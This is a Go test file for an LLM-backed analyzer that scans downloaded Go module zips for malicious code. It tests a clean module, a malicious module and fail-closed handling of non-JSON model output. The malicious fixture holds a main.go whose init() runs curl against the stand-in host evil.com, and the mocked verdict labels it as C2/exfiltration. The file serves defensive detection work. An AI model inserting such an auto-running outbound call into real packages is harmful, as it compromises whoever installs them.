package analyzer

import (
	"archive/zip"
	"bytes"
	"context"
	"net/http"
	"net/http/httptest"
	"testing"

	"github.com/ariary/soa/internal/provider"
)

// mockProvider returns a fixed response for every Complete call.
type mockProvider struct {
	response string
}

func (m *mockProvider) Name() string { return "mock" }

func (m *mockProvider) Complete(_ context.Context, _ provider.Request) (provider.Response, error) {
	return provider.Response{Content: m.response}, nil
}

// createTestZip creates an in-memory zip from a map of path->content.
func createTestZip(t *testing.T, files map[string]string) []byte {
	t.Helper()
	var buf bytes.Buffer
	w := zip.NewWriter(&buf)
	for path, content := range files {
		f, err := w.Create(path)
		if err != nil {
			t.Fatalf("failed to create zip entry %s: %v", path, err)
		}
		if _, err := f.Write([]byte(content)); err != nil {
			t.Fatalf("failed to write zip entry %s: %v", path, err)
		}
	}
	if err := w.Close(); err != nil {
		t.Fatalf("failed to close zip writer: %v", err)
	}
	return buf.Bytes()
}

func TestCodeAnalyzer_Clean(t *testing.T) {
	zipData := createTestZip(t, map[string]string{
		"mod@v1.0.0/main.go": "package main\n\nfunc main() {}\n",
	})

	// Serve the zip over HTTP.
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/zip")
		w.Write(zipData)
	}))
	defer srv.Close()

	mock := &mockProvider{
		response: `{"block":false,"summary":"No malicious signals detected.","findings":[]}`,
	}

	ca := NewCodeAnalyzer(mock, srv.URL, 1<<20)
	result, err := ca.Analyze(context.Background(), AnalysisRequest{
		Module:  "mod",
		Version: "v1.0.0",
	})
	if err != nil {
		t.Fatalf("Analyze: %v", err)
	}

	if result.Block {
		t.Error("expected Block=false")
	}
	if len(result.Findings) != 0 {
		t.Errorf("expected 0 findings, got %d", len(result.Findings))
	}
	if result.Summary != "No malicious signals detected." {
		t.Errorf("unexpected summary: %s", result.Summary)
	}
}

func TestCodeAnalyzer_Malicious(t *testing.T) {
	zipData := createTestZip(t, map[string]string{
		"evil@v0.1.0/main.go": "package main\n\nimport \"os/exec\"\n\nfunc init() { exec.Command(\"curl\", \"evil.com\").Run() }\n",
	})

	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/zip")
		w.Write(zipData)
	}))
	defer srv.Close()

	mock := &mockProvider{
		response: `{
			"block": true,
			"summary": "Package executes a suspicious command in init().",
			"findings": [
				{
					"signal": "exec-in-init",
					"severity": "critical",
					"description": "os/exec.Command called in init() function",
					"evidence": ["main.go:init()"],
					"category": "entry-point"
				},
				{
					"signal": "c2-communication",
					"severity": "high",
					"description": "curl to external domain in init()",
					"evidence": ["main.go:init()"],
					"category": "c2-exfil"
				}
			]
		}`,
	}

	ca := NewCodeAnalyzer(mock, srv.URL, 1<<20)
	result, err := ca.Analyze(context.Background(), AnalysisRequest{
		Module:  "evil",
		Version: "v0.1.0",
	})
	if err != nil {
		t.Fatalf("Analyze: %v", err)
	}

	if !result.Block {
		t.Error("expected Block=true")
	}
	if len(result.Findings) != 2 {
		t.Errorf("expected 2 findings, got %d", len(result.Findings))
	}
}

func TestCodeAnalyzer_InvalidLLMResponse(t *testing.T) {
	zipData := createTestZip(t, map[string]string{
		"mod@v1.0.0/main.go": "package main\n",
	})

	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/zip")
		w.Write(zipData)
	}))
	defer srv.Close()

	mock := &mockProvider{
		response: "This is not JSON at all.",
	}

	ca := NewCodeAnalyzer(mock, srv.URL, 1<<20)
	_, err := ca.Analyze(context.Background(), AnalysisRequest{
		Module:  "mod",
		Version: "v1.0.0",
	})
	if err == nil {
		t.Fatal("expected error for invalid JSON response (fail-closed), got nil")
	}
}
